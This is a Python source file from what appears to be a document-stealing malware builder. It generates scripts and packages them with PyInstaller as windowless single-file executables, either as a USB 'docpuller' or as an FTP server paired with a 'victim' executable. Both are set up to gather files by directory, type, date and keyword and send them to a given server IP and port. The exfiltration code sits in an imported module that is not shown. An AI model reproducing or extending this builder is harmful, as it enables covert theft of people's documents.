import subprocess

from Generator.DocPullerScriptGenerator import ScriptGen


class DocPullerGenerator:

    def __init__(self, save_dir, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.save_dir = save_dir
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port
        self.DOCPULLER_USB_PATH = 'Generator/docpullerscrip.py'
        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscrip.py'
        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/victimscrip.py'

        # Specify additional PyInstaller options if needed
        self.command = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            f"--distpath={self.save_dir}"
        ]

        ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()

    def main(self):
        if self.is_usb:
            print('genarating exe')

            command = self.command + [self.DOCPULLER_USB_PATH]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()
            print('done!')

        else:
            print('genarating server exe')

            command = self.command + [self.DOCPULLER_FTP_SERVER_PATH]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()

            print('genarating victim exe')

            command = self.command + [self.DOCPULLER_FTP_CLIENT_PATH]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()

            print('Done!')
